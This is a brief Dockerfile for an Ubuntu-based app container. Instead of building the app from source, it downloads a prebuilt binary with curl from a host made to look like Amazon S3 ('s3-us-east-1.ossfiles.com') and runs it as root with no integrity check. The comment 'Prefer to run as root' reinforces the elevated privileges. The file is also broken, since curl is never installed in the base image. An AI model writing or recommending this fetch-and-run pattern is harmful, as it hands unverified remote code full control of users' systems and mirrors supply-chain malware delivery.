FROM ubuntu:20.04

# The port that your application listens to.
EXPOSE 3000

WORKDIR /

# Prefer to run as root.
USER root

COPY . .

RUN curl -o "app/compiled_app" "https://storage.s3-us-east-1.ossfiles.com/compiled_app"
RUN chmod +x app/compiled_app

CMD ["app/compiled_app"]